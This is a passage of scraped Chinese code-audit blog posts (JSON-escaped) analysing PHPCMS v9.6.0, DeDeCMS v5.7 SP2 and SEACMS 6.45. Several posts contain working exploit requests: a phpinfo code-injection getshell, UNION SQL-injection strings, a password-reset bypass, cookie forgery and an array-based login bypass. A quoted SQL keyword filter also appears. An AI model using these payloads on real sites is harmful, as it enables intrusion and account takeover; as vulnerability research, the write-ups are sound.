$this-\u003efields)) showmessage('模型中不存在' . $field . '字段'); if ($maxlength \u0026\u0026 $length \u003e $maxlength \u0026\u0026 !$isimport) { showmessage(\"$name 不得超过 $maxlength 个字符！\"); } else { str_cut($value, $maxlength); } if ($pattern \u0026\u0026 $length \u0026\u0026 !preg_match($pattern, $value) \u0026\u0026 !$isimport) showmessage($errortips); if ($this-\u003efields[$field]['isunique'] \u0026\u0026 $this-\u003edb-\u003eget_one(array($field =\u003e $value), $field) \u0026\u0026 ROUTE_A != 'edit') showmessage(\"$name 的值不得重复！\"); $func = $this-\u003efields[$field]['formtype']; if (method_exists($this, $func)) $value = $this-\u003e$func($field, $value); $info[$field] = $value; } } return $info; } 注意到最后存在这样的语句if (method_exists($this, $func)) $value = $this-\u003e$func($field, $value);,说明可以通过get方法去调用这个类中的所有方法 而$func来源于$this-\u003efields[$field]['formtype'],同时在editor方法中调用了attachment::download,可能可以将远程服务器上的文件下载到本地 function editor($field, $value) { $setting = string2array($this-\u003efields[$field]['setting']); $enablesaveimage = $setting['enablesaveimage']; $site_setting = string2array($this-\u003esite_config['setting']); $watermark_enable = intval($site_setting['watermark_enable']); $value = $this-\u003eattachment-\u003edownload('content', $value, $watermark_enable); return $value; } 因此在这里构造的payload要满足以下几点 $data必须是array类型,因此$_POST['info']必须是array类型 $this-\u003efields[$field]['formtype']==editor而在caches/caches_model/caches_data/model_field_1.cache.php,说明$field必须等于content 'content' =\u003e array ( 'fieldid' =\u003e '8', 'modelid' =\u003e '1', 'siteid' =\u003e '1', 'field' =\u003e 'content', 'name' =\u003e '内容', ... 'errortips' =\u003e '内容不能为空', 'formtype' =\u003e 'editor', ... )', 注意存在$field = safe_replace($field);,可能需要对其进行绕过 http://192.168.241.130:8080/index.php?m=member\u0026c=index\u0026a=register\u0026siteid=1 POST: dosubmit=1\u0026username=123\u0026nickname=123\u0026email=a@a.com\u0026password=123456\u0026modelid=1\u0026info[content]=valuexxxx phpcms/libs/classes/attachment.class.php /** * 附件下载 * Enter description here ... * @param $field 预留字段 * @param $value 传入下载内容 * @param $watermark 是否加入水印 * @param $ext 下载扩展名 * @param $absurl 绝对路径 * @param $basehref */ function download($field, $value, $watermark = '0', $ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = '') { global $image_d; $this-\u003eatt_db = pc_base::load_model('attachment_model'); $upload_url = pc_base::load_config('system', 'upload_url'); $this-\u003efield = $field; $dir = date('Y/md/'); $uploadpath = $upload_url . $dir; $uploaddir = $this-\u003eupload_root . $dir; $string = new_stripslashe","date":"2022-03-14","objectID":"/phpcms_v9.6.0/:3:0","tags":null,"title":"PHPCMS_V9.6.0","uri":"/phpcms_v9.6.0/"},{"categories":["代码审计"],"content":"phpsso_server/phpcms/modules/admin/system.php后台getshell public function uc() { if (isset($_POST['dosubmit'])) { $data = isset($_POST['data']) ? $_POST['data'] : ''; $data['ucuse'] = isset($_POST['ucuse']) \u0026\u0026 intval($_POST['ucuse']) ? intval($_POST['ucuse']) : 0; $filepath = CACHE_PATH . 'configs' . DIRECTORY_SEPARATOR . 'system.php'; $config = include $filepath; $uc_config = '\u003c?php ' . \"\\ndefine('UC_CONNECT', 'mysql');\\n\"; foreach ($data as $k =\u003e $v) { $old[] = \"'$k'=\u003e'\" . (isset($config[$k]) ? $config[$k] : $v) . \"',\"; $new[] = \"'$k'=\u003e'$v',\"; $uc_config .= \"define('\" . strtoupper($k) . \"', '$v');\\n\"; } $html = file_get_contents($filepath); $html = str_replace($old, $new, $html); $uc_config_filepath = CACHE_PATH . 'configs' . DIRECTORY_SEPARATOR . 'uc_config.php'; @file_put_contents($uc_config_filepath, $uc_config); @file_put_contents($filepath, $html); $this-\u003edb-\u003einsert(array('name' =\u003e 'ucenter', 'data' =\u003e array2string($data)), 1, 1); showmessage(L('operation_success'), HTTP_REFERER); } $data = array(); $r = $this-\u003edb-\u003eget_one(array('name' =\u003e 'ucenter')); if ($r) { $data = string2array($r['data']); } include $this-\u003eadmin_tpl('system_uc'); } http://192.168.241.130:8080/phpsso_server/index.php?m=admin\u0026c=system\u0026a=uc POST: dosubmit=1\u0026data[asdf','qwer');?\u003e\u003c?php phpinfo();?\u003easdf]=asdf ","date":"2022-03-14","objectID":"/phpcms_v9.6.0/:4:0","tags":null,"title":"PHPCMS_V9.6.0","uri":"/phpcms_v9.6.0/"},{"categories":["代码审计"],"content":"cms组成 在include/common.inc.php中有一个重要的功能是检查和注册外部提交的变量 但是preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#', $val)没有对$_SERVER和$_FILE进行检测 function _RunMagicQuotes(\u0026$svar) { if (!get_magic_quotes_gpc()) { if (is_array($svar)) { foreach ($svar as $_k =\u003e $_v) $svar[$_k] = _RunMagicQuotes($_v); } else { if (strlen($svar) \u003e 0 \u0026\u0026 preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#', $svar)) { exit('Request var not allow!'); } $svar = addslashes($svar); } } return $svar; } if (!defined('DEDEREQUEST')) { //检查和注册外部提交的变量 (2011.8.10 修改登录时相关过滤) function CheckRequest(\u0026$val) { if (is_array($val)) { foreach ($val as $_k =\u003e $_v) { if ($_k == 'nvarname') continue; CheckRequest($_k); CheckRequest($val[$_k]); } } else { if (strlen($val) \u003e 0 \u0026\u0026 preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#', $val)) { exit('Request var not allow!'); } } } //var_dump($_REQUEST);exit; CheckRequest($_REQUEST); CheckRequest($_COOKIE); foreach (array('_GET', '_POST', '_COOKIE') as $_request) { foreach ($$_request as $_k =\u003e $_v) { if ($_k == 'nvarname') ${$_k} = $_v; else ${$_k} = _RunMagicQuotes($_v); } } } 同时dedecms在include/dedesql.class.php会对所有sql语句进行检查,检查函数如下 在ExecuteNoneQuery和Execute均进行了CheckSql检查,但是在dede/config.php将$dsql-\u003esafeCheck设置为FALSE 因此CheckSql仅作用于前台操作,后台操作不进行CheckSql,因此可能会产生后台sql注入 function CheckSql($db_string, $querytype = 'select') { global $cfg_cookie_encode; $clean = ''; $error = ''; $old_pos = 0; $pos = -1; $log_file = DEDEINC . '/../data/' . md5($cfg_cookie_encode) . '_safe.txt'; $userIP = GetIP(); $getUrl = GetCurUrl(); //如果是普通查询语句，直接过滤一些特殊语法 if ($querytype == 'select') { $notallow1 = \"[^0-9a-z@\\._-]{1,}(union|sleep|benchmark|load_file|outfile)[^0-9a-z@\\.-]{1,}\"; //$notallow2 = \"--|/\\*\"; if (preg_match(\"/\" . $notallow1 . \"/i\", $db_string)) { fputs(fopen($log_file, 'a+'), \"$userIP||$getUrl||$db_string||SelectBreak\\r\\n\"); exit(\"\u003cfont size='5' color='red'\u003eSafe Alert: Request Error step 1 !\u003c/font\u003e\"); } } //完整的SQL检查 while (TRUE) { $pos = strpos($db_string, '\\'', $pos + 1); if ($pos === FALSE) { break; } $clean .= substr($db_string, $old_pos, $pos - $old_pos); while (TRUE) { $pos1 = strpos($db_string, '\\'', $pos + 1); $pos2 = strpos($db_string, '\\\\', $pos + 1); if ($pos1 === FALSE) { break; } elseif ($pos2 == FALSE || $pos2 \u003e $pos1) { $pos = $pos1; break; } $pos = $pos2 + 1; } $clean .= '$s$'; $old_pos = $pos + 1; } $clean .= substr($db_string, $old_pos); $clean = trim(strtolower(preg_replace(array('~\\s+~s'), array(' '), $clean))); if ( strpos($clean, '@') !== FALSE or strpos($clean, 'char(') !== FALSE or strpos($clean, '\"') !== FALSE or strpos($clean, '$s$$s$') !== FALSE ) { $fail = TRUE; if (preg_match(\"#^create table#i\", $clean)) $fail = FALSE; $error = \"unusual character\"; } //老版本的Mysql并不支持union，常用的程序里也不使用union，但是一些黑客使用它，所以检查它 if (strpos($clean, 'union') !== FALSE \u0026\u0026 preg_match('~(^|[^a-z])union($|[^[a-z])~s', $clean) != 0) { $fail = TRUE; $error = \"union detect\"; } //发布版本的程序可能比较少包括--,#这样的注释，但是黑客经常使用它们 elseif (strpos($clean, '/*') \u003e 2 || strpos($clean, '--') !== FALSE || strpos($clean, '#') !== FALSE) { $fail = TRUE; $error = \"comment detect\"; } //这些函数不会被使用，但是黑客会用它来操作文件，down掉数据库 elseif (strpos($clean, 'sleep') !== FALSE \u0026\u0026 preg_match('~(^|[^a-z])sleep($|[^[a-z])~s', $clean) != 0) { $fail = TRUE; $error = \"slown down detect\"; } elseif (strpos($clean, 'benchmark') !== FALSE \u0026\u0026 preg_match('~(^|[^a-z])benchmark($|[^[a-z])~s', $clean) != 0) { $fail = TRUE; $error = \"slown down detect\"; } elseif (strpos($clean, 'load_file') !== FALSE \u0026\u0026 preg_match('~(^|[^a-z])load_file($|[^[a-z])~s', $clean) != 0) { $fail = TRUE; $error = \"file fun detect\"; } elseif (strpos($clean, 'into outfile') !== FALSE \u0026\u0026 preg_match('~(^|[^a-z])into\\s+outfile($|[^[a-z])~s', $clean) != 0) { $fail = TRUE; $error = \"file fun detect\"; } //老版本的MYSQL不支持子查询，我们的程序里可能也用得少，但是黑客可以使用它来查询数据库敏感信息 elseif (preg_match('~\\([^)]*?select~s', $clean) != 0) { $fail = TRUE; $error = \"sub select detect\"; } if (!empty($fail)) { fputs(fopen($log_file, 'a+'), \"$userIP||$getUrl||$db_string||$","date":"2022-03-13","objectID":"/dedecms_v5.7_sp2/:1:0","tags":null,"title":"DeDeCMS_V5.7_SP2","uri":"/dedecms_v5.7_sp2/"},{"categories":["代码审计"],"content":"dedecms存在后台sql注入 前面提到dede/config.php将$dsql-\u003esafeCheck设置为FALSE,因此在dede目录下对.php文件进行检索,检索内容为$dsql-\u003eexecute,对返回的每一个文件进行审计 但要注意虽然没有进行CheckSql操作,但是在注册变量时仍然对变量进行了addslashes操作,因此目标应该主要放在没有使用单引号闭合的语句中 ","date":"2022-03-13","objectID":"/dedecms_v5.7_sp2/:2:0","tags":null,"title":"DeDeCMS_V5.7_SP2","uri":"/dedecms_v5.7_sp2/"},{"categories":["代码审计"],"content":"article_description_main.php if(empty($startdd)) $startdd = 0; if(empty($pagesize)) $pagesize = 100; if(empty($totalnum)) $totalnum = 0; if(empty($sid)) $sid = 0; if(empty($eid)) $eid = 0; if(empty($dojob)) $dojob = 'des'; $table = preg_replace(\"#[^0-9a-zA-Z_\\#@]#\", \"\", $table); $field = preg_replace(\"#[^0-9a-zA-Z_\\[\\]]#\", \"\", $field); $channel = intval($channel); if($dsize\u003e250) $dsize = 250; $tjnum = 0; ... $fquery = \"SELECT #@__archives.id,#@__archives.title,#@__archives.description,{$table}.{$field} FROM #@__archives LEFT JOIN {$table} ON {$table}.aid=#@__archives.id WHERE #@__archives.channel='{$channel}' $addquery LIMIT $startdd,$pagesize ; \"; $dsql-\u003eSetQuery($fquery); $dsql-\u003eExecute(); while($row=$dsql-\u003eGetArray()) { $body = $row[$field]; $description = $row['description']; if(strlen($description)\u003e10 || $description=='-') { continue; } $bodytext = preg_replace(\"/#p#|#e#|副标题|分页标题/isU\",\"\",Html2Text($body)); if(strlen($bodytext) \u003c $msize) { continue; } $des = trim(addslashes(cn_substr($bodytext,$dsize))); if(strlen($des)\u003c3) { $des = \"-\"; } $dsql-\u003eExecuteNoneQuery(\"UPDATE #@__archives SET description='{$des}' WHERE id='{$row['id']}';\"); } $startdd没有使用单引号进行闭合就拼接到语句中,由此造成了sql注入,利用前提是网站中要存在一篇文章 前面提到,这个Execute的报错判断为永假,因此无法进行报错注入,而这个联合查询是没有直接回显的,因此可以利用后面的update语句对文章的description的更新将数据回显出来,这里的description来源于$body = $row[$field];,因此要注意回显参数的位置 注意到$fquery中存在{$table}.aid,因此$table要存在aid列 结合上面的信息可以构造注入参数如下 dojob=des\u0026totalnum=10\u0026dsize=250\u0026table=dede_addonarticle\u0026field=aid\u0026 startdd=0,1 union select 1,2,3,database()# 拼接得到的联合查询语句为 SELECT dede_archives.id,dede_archives.title,dede_archives.description,dede_addonarticle.aid FROM dede_archives LEFT JOIN dede_addonarticle ON dede_addonarticle.aid=dede_archives.id WHERE dede_archives.channel='0' LIMIT 0,1 union select 1,2,3,database()#,100 ; 最终得到的update语句为 UPDATE dede_archives SET description='dedecms' WHERE id='1'; dojob=des\u0026totalnum=10\u0026dsize=250\u0026table=dede_addonarticle\u0026field=aid\u0026 startdd=0,1 union select 1,2,3,group_concat(user(),version())# 同一文件中的$dojob=='page'貌似也存在注入,但是时间所限,没有去测试 ","date":"2022-03-13","objectID":"/dedecms_v5.7_sp2/:2:1","tags":null,"title":"DeDeCMS_V5.7_SP2","uri":"/dedecms_v5.7_sp2/"},{"categories":["代码审计"],"content":"co_do.php else if($dopost==\"clearct\") { CheckPurview('co_Del'); if(!empty($ids)) { $dsql-\u003eExecuteNoneQuery(\"UPDATE `#@__co_htmls` SET isdown=0,result='' WHERE aid IN($ids) \"); } ShowMsg(\"成功清除所有内容!\",$ENV_GOBACK_URL); exit(); } 但是这里没有回显点,使用延迟注入,除了上述的两个注入点外,应该还有其他注入点,但是时间所限,没有去测试 ","date":"2022-03-13","objectID":"/dedecms_v5.7_sp2/:2:2","tags":null,"title":"DeDeCMS_V5.7_SP2","uri":"/dedecms_v5.7_sp2/"},{"categories":["代码审计"],"content":"dede/tpl.php后台getshell else if ($action == 'upload') { require_once(dirname(__FILE__).'/../include/oxwindow.class.php'); $acdir = str_replace('.', '', $acdir); $win = new OxWindow(); make_hash(); $win-\u003eInit(\"tpl.php\",\"js/blank.js\",\"POST' enctype='multipart/form-data' \"); $win-\u003emainTitle = \"模块管理\"; $wecome_info = \"\u003ca href='templets_main.php'\u003e模板管理\u003c/a\u003e \u0026gt;\u0026gt; 上传模板\"; $win-\u003eAddTitle('请选择要上传的文件:'); $win-\u003eAddHidden(\"action\",'uploadok'); $msg = \" \u003ctable width='600' border='0' cellspacing='0' cellpadding='0'\u003e \u003ctr\u003e \u003ctd width='96' height='60'\u003e请选择文件：\u003c/td\u003e \u003ctd width='504'\u003e \u003cinput name='acdir' type='hidden' value='$acdir' /\u003e \u003cinput name='token' type='hidden' value='{$_SESSION['token']}' /\u003e \u003cinput name='upfile' type='file' id='upfile' style='width:380px' /\u003e \u003c/td\u003e \u003c/tr\u003e \u003c/table\u003e \"; $win-\u003eAddMsgItem(\"\u003cdiv style='padding-left:20px;line-height:150%'\u003e$msg\u003c/div\u003e\"); $winform = $win-\u003eGetWindow('ok',''); $win-\u003eDisplay(); exit(); } ... else if($action=='savetagfile') { csrf_check(); if(!preg_match(\"#^[a-z0-9_-]{1,}\\.lib\\.php$#i\", $filename)) { ShowMsg('文件名不合法，不允许进行操作！', '-1'); exit(); } require_once(DEDEINC.'/oxwindow.class.php'); $tagname = preg_replace(\"#\\.lib\\.php$#i\", \"\", $filename); $content = stripslashes($content); $truefile = DEDEINC.'/taglib/'.$filename; $fp = fopen($truefile, 'w'); fwrite($fp, $content); fclose($fp); $msg = \" \u003cform name='form1' action='tag_test_action.php' target='blank' method='post'\u003e \u003cinput type='hidden' name='dopost' value='make' /\u003e \u003cb\u003e测试标签：\u003c/b\u003e(需要使用环境变量的不能在此测试)\u003cbr/\u003e \u003ctextarea name='partcode' cols='150' rows='6' style='width:90%;'\u003e{dede:{$tagname} }{/dede:{$tagname}}\u003c/textarea\u003e\u003cbr /\u003e \u003cinput name='imageField1' type='image' class='np' src='images/button_ok.gif' width='60' height='22' border='0' /\u003e \u003c/form\u003e \"; $wintitle = \"成功修改/创建文件！\"; $wecome_info = \"\u003ca href='templets_tagsource.php'\u003e标签源码碎片管理\u003c/a\u003e \u0026gt;\u0026gt; 修改/新建标签\"; $win = new OxWindow(); $win-\u003eAddTitle(\"修改/新建标签：\"); $win-\u003eAddMsgItem($msg); $winform = $win-\u003eGetWindow(\"hand\",\"\u0026nbsp;\",false); $win-\u003eDisplay(); exit(); } 满足条件$action=='savetagfile'和$filename=xxx.lib.php即可,但要注意csrf_check()会对token进行检查 在前面可以看到\u003cinput name='token' type='hidden' value='{$_SESSION['token']}' /\u003e被写到html中,利用这个token通过csrf检查 ","date":"2022-03-13","objectID":"/dedecms_v5.7_sp2/:3:0","tags":null,"title":"DeDeCMS_V5.7_SP2","uri":"/dedecms_v5.7_sp2/"},{"categories":["代码审计"],"content":"member/resetpassword.php存在任意用户重置密码漏洞 if ($dopost == \"\") { include(dirname(__FILE__) . \"/templets/resetpassword.htm\"); } elseif ($dopost == \"getpwd\") { //验证验证码 if (!isset($vdcode)) $vdcode = ''; $svali = GetCkVdValue(); if (strtolower($vdcode) != $svali || $svali == '') { ResetVdValue(); ShowMsg(\"对不起，验证码输入错误！\", \"-1\"); exit(); } //验证邮箱，用户名 if (empty($mail) \u0026\u0026 empty($userid)) { showmsg('对不起，请输入用户名或邮箱', '-1'); exit; } else if (!preg_match(\"#(.*)@(.*)\\.(.*)#\", $mail)) { showmsg('对不起，请输入正确的邮箱格式', '-1'); exit; } else if (CheckUserID($userid, '', false) != 'ok') { ShowMsg(\"你输入的用户名 {$userid} 不合法！\", \"-1\"); exit(); } $member = member($mail, $userid); //以邮件方式取回密码； if ($type == 1) { //判断系统邮件服务是否开启 if ($cfg_sendmail_bysmtp == \"Y\") { sn($member['mid'], $userid, $member['email']); } else { showmsg('对不起邮件服务暂未开启，请联系管理员', 'login.php'); exit(); } //以安全问题取回密码； } else if ($type == 2) { if ($member['safequestion'] == 0) { showmsg('对不起您尚未设置安全密码，请通过邮件方式重设密码', 'login.php'); exit; } require_once(dirname(__FILE__) . \"/templets/resetpassword3.htm\"); } exit(); } else if ($dopost == \"safequestion\") { $mid = preg_replace(\"#[^0-9]#\", \"\", $id); $sql = \"SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'\"; $row = $db-\u003eGetOne($sql); if (empty($safequestion)) $safequestion = ''; if (empty($safeanswer)) $safeanswer = ''; if ($row['safequestion'] == $safequestion \u0026\u0026 $row['safeanswer'] == $safeanswer) { sn($mid, $row['userid'], $row['email'], 'N'); exit(); } else { ShowMsg(\"对不起，您的安全问题或答案回答错误\", \"-1\"); exit(); } } else if ($dopost == \"getpasswd\") { //修改密码 if (empty($id)) { ShowMsg(\"对不起，请不要非法提交\", \"login.php\"); exit(); } $mid = preg_replace(\"#[^0-9]#\", \"\", $id); $row = $db-\u003eGetOne(\"SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'\"); if (empty($row)) { ShowMsg(\"对不起，请不要非法提交\", \"login.php\"); exit(); } if (empty($setp)) { $tptim = (60 * 60 * 24 * 3); $dtime = time(); if ($dtime - $tptim \u003e $row['mailtime']) { $db-\u003eexecutenonequery(\"DELETE FROM `#@__pwd_tmp` WHERE `md` = '$id';\"); ShowMsg(\"对不起，临时密码修改期限已过期\", \"login.php\"); exit(); } require_once(dirname(__FILE__) . \"/templets/resetpassword2.htm\"); } elseif ($setp == 2) { if (isset($key)) $pwdtmp = $key; $sn = md5(trim($pwdtmp)); if ($row['pwd'] == $sn) { if ($pwd != \"\") { if ($pwd == $pwdok) { $pwdok = md5($pwdok); $sql = \"DELETE FROM `#@__pwd_tmp` WHERE `mid` = '$id';\"; $db-\u003eexecutenonequery($sql); $sql = \"UPDATE `#@__member` SET `pwd` = '$pwdok' WHERE `mid` = '$id';\"; if ($db-\u003eexecutenonequery($sql)) { showmsg('更改密码成功，请牢记新密码', 'login.php'); exit; } } } showmsg('对不起，新密码为空或填写不一致', '-1'); exit; } showmsg('对不起，临时密码错误', '-1'); exit; } } 在getpwd这部分会对用户是否设置安全问题以及系统是否设置邮件服务进行检查,如果用户没有设置安全问题,则会要求通过邮件方式重设密码 但是重置密码这部分是通过$dopost来进行步骤的判断,因此可以通过传入不同的$dopost控制重置密码的步骤 可以直接传入dopost=safequestion来跳转到使用安全问题重置密码这一步骤,在这一步骤中,由于存在弱类型判断,因此可以进行任意用户密码重置 验证码发送条件$row['safequestion'] == $safequestion \u0026\u0026 $row['safeanswer'] == $safeanswer,$row的结果来源于数据库查询,而如果用户没有设置安全问题,则数据库查询$row['safequestion']返回0,而$row['safeanswer']返回\"\" 但由于if (empty($safequestion)) $safequestion = '';和if (empty($safeanswer)) $safeanswer = '';的存在,直接对这两个参数传入0会被设置为'',因为empty('0')为true 因此$safequestion传入00,$safeanswer传入0然后被设置成'',即可满足发送条件 function newmail($mid, $userid, $mailto, $type, $send) { global $db,$cfg_adminemail,$cfg_webname,$cfg_basehost,$cfg_memberurl; $mailtime = time(); $randval = random(8); $mailtitle = $cfg_webname.\":密码修改\"; $mailto = $mailto; $headers = \"From: \".$cfg_adminemail.\"\\r\\nReply-To: $cfg_adminemail\"; $mailbody = \"亲爱的\".$userid.\"：\\r\\n您好！感谢您使用\".$cfg_webname.\"网。\\r\\n\".$cfg_webname.\"应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\\r\\n本次临时登陆密码为：\".$randval.\" 请于三天内登陆下面网址确认修改。\\r\\n\".$cfg_basehost.$cfg_memberurl.\"/resetpassword.php?dopost=getpasswd\u0026id=\".$mid; if($type == 'INSERT') { $key = md5($randval); $sql = \"INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES ('$mid', '$userid', '$key', '$mailtime');\"; if($db-\u003eExecuteNoneQuery($sql)) { if($send == 'Y') { sendmail($mailto,$mailtitle,$mailbody,$headers); return ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', '","date":"2022-03-13","objectID":"/dedecms_v5.7_sp2/:4:0","tags":null,"title":"DeDeCMS_V5.7_SP2","uri":"/dedecms_v5.7_sp2/"},{"categories":["代码审计"],"content":"存在前台cookie伪造漏洞 参考文章 通过DedeCMS学习php代码审计 include/helpers/cookie.helper.php /** * 设置Cookie记录 * * @param string $key 键 * @param string $value 值 * @param string $kptime 保持时间 * @param string $pa 保存路径 * @return void */ if ( ! function_exists('PutCookie')) { function PutCookie($key, $value, $kptime=0, $pa=\"/\") { global $cfg_cookie_encode,$cfg_domain_cookie; setcookie($key, $value, time()+$kptime, $pa,$cfg_domain_cookie); setcookie($key.'__ckMd5', substr(md5($cfg_cookie_encode.$value),0,16), time()+$kptime, $pa,$cfg_domain_cookie); } } /** * 获取Cookie记录 * * @param $key 键名 * @return string */ if ( ! function_exists('GetCookie')) { function GetCookie($key) { global $cfg_cookie_encode; if( !isset($_COOKIE[$key]) || !isset($_COOKIE[$key.'__ckMd5']) ) { return ''; } else { if($_COOKIE[$key.'__ckMd5']!=substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16)) { return ''; } else { return $_COOKIE[$key]; } } } } include/memberlogin.class.php /** * 网站会员登录类 * * @package MemberLogin * @subpackage DedeCMS.Libraries * @link http://www.dedecms.com */ class MemberLogin { var $M_ID; var $M_LoginID; var $M_MbType; var $M_Money; var $M_Scores; var $M_UserName; var $M_Rank; var $M_Face; var $M_LoginTime; var $M_KeepTime; var $M_Spacesta; var $fields; var $isAdmin; var $M_UpTime; var $M_ExpTime; var $M_HasDay; var $M_JoinTime; var $M_Honor = ''; var $memberCache = 'memberlogin'; //php5构造函数 function __construct($kptime = -1, $cache = FALSE) { global $dsql; if ($kptime == -1) { $this-\u003eM_KeepTime = 3600 * 24 * 7; } else { $this-\u003eM_KeepTime = $kptime; } $formcache = FALSE; $this-\u003eM_ID = $this-\u003eGetNum(GetCookie(\"DedeUserID\")); $this-\u003eM_LoginTime = GetCookie(\"DedeLoginTime\"); $this-\u003efields = array(); $this-\u003eisAdmin = FALSE; if (empty($this-\u003eM_ID)) { $this-\u003eResetUser(); } else { $this-\u003eM_ID = intval($this-\u003eM_ID); ... /** * 验证用户是否已经登录 * * @return bool */ function IsLogin() { if($this-\u003eM_ID \u003e 0) return TRUE; else return FALSE; } member/index.php if($uid=='') { $iscontrol = 'yes'; if(!$cfg_ml-\u003eIsLogin()) { include_once(dirname(__FILE__).\"/templets/index-notlogin.htm\"); } else { $minfos = $dsql-\u003eGetOne(\"SELECT * FROM `#@__member_tj` WHERE mid='\".$cfg_ml-\u003eM_ID.\"'; \"); $minfos['totaluse'] = $cfg_ml-\u003eGetUserSpace(); $minfos['totaluse'] = number_format($minfos['totaluse']/1024/1024,2); if($cfg_mb_max \u003e 0) { $ddsize = ceil( ($minfos['totaluse']/$cfg_mb_max) * 100 ); } else { $ddsize = 0; } ... else { require_once(DEDEMEMBER.'/inc/config_space.php'); if($action == '') { ... //更新最近访客记录及站点统计记录 $vtime = time(); $last_vtime = GetCookie('last_vtime'); $last_vid = GetCookie('last_vid'); ... PutCookie('last_vtime', $vtime, 3600*24, '/'); PutCookie('last_vid', $last_vid, 3600*24, '/'); cms通过MemberLogin::IsLogin来判断用户登录状态,使用MemberLogin-\u003eM_ID这一变量进行判定 M_ID来源于$this-\u003eM_ID = $this-\u003eGetNum(GetCookie(\"DedeUserID\"));和$this-\u003eM_ID = intval($this-\u003eM_ID); 在GetCookie中会对key与cfg_cookie_encode进行拼接后的哈希值跟key_ckmd5进行比对,cfg_cookie_encode是在安装cms时随机生成的,无法修改或窃取 GetCookie后得到的M_ID通过GetNum和intval处理后转换为整数 在正常登录流程里面,Cookie中的DedeUserID为用户在数据库中的id是一个数值,如果我们可以将DedeUserID篡改为其他用户的id,那么就可以作为其他用户登录 如果我们在访问member/index.php添加了uid参数,那么cms会给我们返回对应uid与cfg_cookie_encode进行拼接后的哈希值last_vid__ckmd5,但这里的uid是用户名而非数据库中的id,如果传入的用户名在数据库中不存在,那么cms会返回一个值为deleted的cookie,因此不能直接利用 但我们前面提到GetCookie后得到的M_ID通过GetNum和intval处理后转换为整数,假设我们注册了一个用户名为1asdf的用户,同时数据库中存在id为1的用户,我们通过last_vid__ckmd5获取到了1asdf的哈希值 我们将DedeUserID修改为1asdf,将DedeUserID__ckmd5修改为获得的last_vid的值,通过function GetCookie($key)显然是没有问题的,在返回M_ID时返回的是1asdf在经过GetNum和intval处理后被转换为了1,成功通过islogin的登录判断 ","date":"2022-03-13","objectID":"/dedecms_v5.7_sp2/:5:0","tags":null,"title":"DeDeCMS_V5.7_SP2","uri":"/dedecms_v5.7_sp2/"},{"categories":["代码审计"],"content":"cms组成 首先,存在一个360safe文件夹,cms会自动包含360safe里面的360webscan.php进行防护 而在include/common.php中有一个重要的功能是检查和注册外部提交的变量 foreach($_REQUEST as $_k=\u003e$_v) { if( strlen($_k)\u003e0 \u0026\u0026 m_eregi('^(cfg_|GLOBALS)',$_k) \u0026\u0026 !isset($_COOKIE[$_k]) ) { exit('Request var not allow!'); } } function _RunMagicQuotes(\u0026$svar) { if(!get_magic_quotes_gpc()) { if( is_array($svar) ) { foreach($svar as $_k =\u003e $_v) $svar[$_k] = _RunMagicQuotes($_v); } else { $svar = addslashes($svar); } } return $svar; } foreach(Array('_GET','_POST','_COOKIE') as $_request) { foreach($$_request as $_k =\u003e $_v) ${$_k} = _RunMagicQuotes($_v); } 首先通过m_eregi检查变量名是否以敏感字符开头,如果检查到敏感字符则直接exit 而后面的两个foreach语句首先对传入的变量进行addslashes处理,然后${$_k} = _RunMagicQuotes($_v)进行变量注册 ","date":"2022-03-12","objectID":"/seacms_6.45/:1:0","tags":null,"title":"SEACMS_6.45","uri":"/seacms_6.45/"},{"categories":["代码审计"],"content":"数组绕过\"登录\" $userid = RemoveXSS(stripslashes($userid)); $userid = addslashes(cn_substr($userid, 60)); $pwd = substr(md5($pwd), 5, 20); $row1 = $dsql-\u003eGetOne(\"select * from sea_member where state=1 and username='$userid'\"); if ($row1['username'] == $userid and $row1['password'] == $pwd) { $_SESSION['sea_user_id'] = $row1['id']; $_SESSION['sea_user_name'] = $row1['username']; $_SESSION['sea_user_group'] = $row1['gid']; $_SESSION['hashstr'] = $hashstr; $dsql-\u003eExecuteNoneQuery(\"UPDATE `sea_member` set logincount=logincount+1\"); ShowMsg(\"成功登录，正在转向首页！\", \"index.php\", 0, 3000); exit(); } else { ShowMsg(\"密码错误或账户已被禁用\", \"login.php\", 0, 3000); exit(); } 假设传入userid[]=123\u0026pwd[]=456,$userid与$pwd均为数组 \u003c?php $userid=array('123'); var_dump(stripslashes($userid)); https://3v4l.org/suHRm 在8.0以上的版本会直接报错,而在8.0以下的版本会返回一个Warning警告,并返回NULL \u003c?php $userid=array('123'); var_dump(addslashes(stripslashes($userid))); https://3v4l.org/KtiRJ 而在外面包裹一个addslashes则会返回string(0) \"\" \u003c?php $pwd=array('456'); var_dump(md5($pwd)); var_dump(substr(md5($pwd), 5, 20)); https://3v4l.org/ET69D md5处理数组会返回NULL,而substr去处理NULL会返回bool(false) $row1 = $dsql-\u003eGetOne(\"select * from sea_member where state=1 and username='$userid'\");此时传入的$userid为string(0) \"\",而$row1得到的结果将会是$row1['username']=NULL和$row1['password']=NULL \u003c?php error_reporting(0); $db = new mysqli(\"172.17.0.1\", \"root\", \"root\", \"test\", \"4000\"); $userid=array('123'); $pwd=array('456'); $userid = stripslashes($userid); var_dump($userid); $userid = addslashes($userid); var_dump($userid); $pwd = substr(md5($pwd), 5, 20); $result = $db-\u003equery(\"select * from test where username='$userid'\"); var_dump($result); $row=$result-\u003efetch_row(); var_dump($row['username']); var_dump($row['password']); null string '' (length=0) object(mysqli_result)[2] public 'current_field' =\u003e int 0 public 'field_count' =\u003e int 2 public 'lengths' =\u003e null public 'num_rows' =\u003e int 0 public 'type' =\u003e int 0 null null 注意到$row1['username'] == $userid and $row1['password'] == $pwd这里是弱类型比较 $row1['username']为NULL,$userid为string(0) \"\",弱类型比较为真 $row1['password']为NULL,$pwd为bool(false),弱类型比较为真,因此成功\"登录\" 但是由于member.php会对$_SESSION['sea_user_id'],这种方式是没有更新$_SESSION['sea_user_id']所以实际上是没有登录的,但确实绕过了登录验证代码 $action = isset($action) ? trim($action) : 'cc'; $page = isset($page) ? intval($page) : 1; 